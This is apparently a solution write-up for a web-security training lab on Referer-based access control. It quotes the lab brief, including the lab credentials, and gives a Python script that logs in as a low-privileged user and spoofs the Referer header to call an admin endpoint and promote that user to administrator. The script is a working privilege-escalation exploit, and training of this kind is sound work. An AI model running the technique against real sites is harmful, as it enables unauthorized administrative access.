# Referer-based access control

> This lab controls access to certain admin functionality based on the Referer header. You can familiarize yourself with the admin panel by logging in using the credentials `administrator:admin`.
> To solve the lab, log in using the credentials `wiener:peter` and exploit the flawed access controls to promote yourself to become an administrator.

```python
import requests
import sys

# Configuration
BASE_URL = "https://0ad400ca03b858d682f3e21c004b001b.web-security-academy.net/"

def create_session(url):
    """Establishes an authenticated session for the low-privileged user."""
    session = requests.Session()
    login_url = f"{url}login"
    
    credentials = {
        "username": "wiener",
        "password": "peter"
    }
    
    print(f"[*] Logging in as 'wiener'...")
    response = session.post(login_url, data=credentials)
    
    if "Log out" in response.text:
        print("[+] Login Successful.")
        return session
    else:
        print("[-] Login Failed.")
        sys.exit(1)

def exploit_referer_bypass(url, session):
    """Promotes the user by spoofing the Referer header."""
    promote_endpoint = f"{url}admin-roles"
    
    # Payload for privilege escalation
    params = {
        "username": "wiener",
        "action": "upgrade"
    }
    
    # The vulnerability: Access control depends on this header
    headers = {
        "Referer": f"{url}admin"
    }
    
    print(f"[*] Sending upgrade request with spoofed Referer...")
    print(f"[*] Referer set to: {headers['Referer']}")
    
    # Send GET request with the spoofed header
    response = session.get(promote_endpoint, params=params, headers=headers)
    
    # Verify success (200 OK or 302 Redirect usually indicate success)
    if response.status_code in [200, 302]:
        print(f"[+] SUCCESS: 'wiener' promoted to Administrator. (Status: {response.status_code})")
        
        # Optional: Verify by checking access to admin panel
        if session.get(f"{url}admin").status_code == 200:
            print("[+] Admin panel access confirmed.")
    else:
        print(f"[-] Exploit failed. Status: {response.status_code}")

if __name__ == "__main__":
    user_session = create_session(BASE_URL)
    exploit_referer_bypass(BASE_URL, user_session)
```